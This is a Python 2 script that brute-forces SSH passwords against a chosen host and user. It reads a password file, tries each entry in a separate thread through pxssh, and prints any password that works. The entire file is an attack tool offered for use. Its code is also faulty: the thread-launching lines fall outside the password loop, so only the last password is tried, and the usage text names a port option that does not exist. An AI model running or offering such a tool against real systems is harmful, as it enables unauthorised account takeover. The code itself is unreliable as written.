#!/usr/bin/python

import pxssh
import optparse
import sys
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def send_commands(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print "[+] Password Found: "+password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails +=1
            time.sleep(5)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()

def main():
    scriptname = sys.argv[0]
    parser = optparse.OptionParser('Example: '+scriptname+' -t <target host> -p <target port> -F <file.txt>')
    parser.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify user')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    user = options.user
    passwdFile = options.passwdFile

    if tgtHost == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    f = open(passwdFile, 'r')
    for line in f.readlines():
        if Found:
            print "[*] Exiting: Password Found"
            exit (0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)
    connection_lock.acquire()
    password = line.strip('\r').strip('\n')
    print "[-] Testing: "+str(password)
    t = Thread(target=connect, args=(tgtHost, user, password, True))
    child = t.start()

if __name__ == '__main__':
    main()
